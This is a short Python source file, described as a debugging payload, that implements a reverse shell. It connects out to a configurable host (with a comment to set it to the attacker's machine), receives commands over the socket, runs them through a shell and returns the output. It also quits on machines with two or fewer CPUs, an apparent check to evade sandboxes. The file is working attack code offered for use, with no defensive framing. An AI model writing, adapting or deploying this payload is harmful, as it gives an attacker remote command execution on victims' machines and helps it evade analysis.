# Simple payload for debugging. A more advanced payload is coming soon

import os
import socket
import subprocess


if os.cpu_count() <= 2:
    quit()

HOST = '127.0.0.1' # Change this host address to attacker machine address
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.send(str.encode("Successfully entered reverse shell session.\n"))

while 1:
    try:
        s.send(str.encode(os.getcwd() + " > "))
        data = s.recv(1024).decode("UTF-8")
        data = data.strip('\n')
        if data == "quit": 
            break
        if data[:2] == "cd":
            os.chdir(data[3:])
        if len(data) > 0:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
            stdout_value = proc.stdout.read() + proc.stderr.read()
            output_str = str(stdout_value, "UTF-8")
            s.send(str.encode("\n" + output_str))
    except Exception as e:
        continue
    
s.close()
